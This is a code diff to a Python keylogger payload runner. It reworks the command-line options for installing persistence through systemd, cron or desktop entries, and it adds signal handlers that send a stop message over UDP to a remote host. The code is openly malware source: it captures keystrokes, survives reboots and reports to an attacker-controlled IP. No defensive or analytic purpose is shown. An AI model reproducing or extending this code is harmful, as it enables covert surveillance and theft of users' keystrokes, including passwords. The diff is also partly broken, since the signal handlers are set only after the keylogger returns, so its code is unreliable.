@@ -11,6 +11,7 @@ It also creates a backup of itself before executing the keylogger functionality.
 
 import os
 import sys
+import signal
 import argparse
 import logging
 from pathlib import Path
@@ -43,36 +44,31 @@ if getattr(sys, 'frozen', False):
     if hasattr(pynput, '_logger'):
         pynput._logger = keyboard_logger
 
+def create_signal_handler(keylogger_instance: KeyloggerViruss):
+    def signal_handler(signum, frame):
+        print("Signal received, stopping keylogger...")
+        message = "[KEYLOGGER STOPPED]"
+        keylogger_instance.send_udp_message(message=message, signal=False)
+        sys.exit(0)
+    return signal_handler
+
 
 def main():
     # ----- parse CLI args -----
     parser = argparse.ArgumentParser(description="Payload runner. Default installs only desktop entry persistence.")
     group = parser.add_mutually_exclusive_group()
-    group.add_argument("--only-systemd", action="store_true", help="Install only the systemd unit (no cron, no desktop entry)")
-    group.add_argument("--only-cron", action="store_true", help="Install only the cron job (no systemd, no desktop entry)")
-    group.add_argument("--only-desktop", action="store_true", help="Install only the desktop entry (no systemd, no cron)")
-    parser.add_argument("--no-systemd", action="store_true", help="Do not install systemd unit")
-    parser.add_argument("--no-cron", action="store_true", help="Do not install cron job")
-    parser.add_argument("--no-desktop", action="store_true", help="Do not install desktop entry")
+    group.add_argument("--systemd", action="store_true", help="Install only the systemd unit")
+    group.add_argument("--cron", action="store_true", help="Install only the cron job")
+    group.add_argument("--desktop-entry", action="store_true", help="Install only the desktop entry")
     parser.add_argument("--all-enable", action="store_true", help="Install both systemd and cron and desktop entry (default)")
     parser.add_argument("--all-disable", action="store_true", help="Do not install any persistence mechanism")
+
+    parser.set_defaults(desktop_entry=True)
 
     args = parser.parse_args()
 
     # determine installation choices
-    if args.only_systemd:
-        do_systemd = True
-        do_cron = False
-        do_desktop = False
-    elif args.only_cron:
-        do_systemd = False
-        do_cron = True
-        do_desktop = False
-    elif args.only_desktop:
-        do_systemd = False
-        do_cron = False
-        do_desktop = True
-    elif args.all_enable:
+    if args.all_enable:
         do_systemd = True
         do_cron = True
         do_desktop = True
@@ -81,10 +77,9 @@ def main():
         do_cron = False
         do_desktop = False
     else:
-        do_systemd = False
-        do_cron = False
-        do_desktop = True
-
+        do_systemd = args.systemd
+        do_cron = args.cron
+        do_desktop = args.desktop_entry
 
     # ----- prepare paths and names -----
     create_dirs_if_not_exists()
@@ -146,7 +141,11 @@ def main():
     # 3. Run keylogger
     keylogger = KeyloggerViruss(host=IP)
     keylogger.run_keylogger()
-    print("End process keylogger. Deleting and creating backup...")
+
+    # 4. Setup signal handlers for graceful shutdown
+    signal_handler = create_signal_handler(keylogger)
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.signal(signal.SIGTERM, signal_handler)
 
 if __name__ == "__main__":
     main()
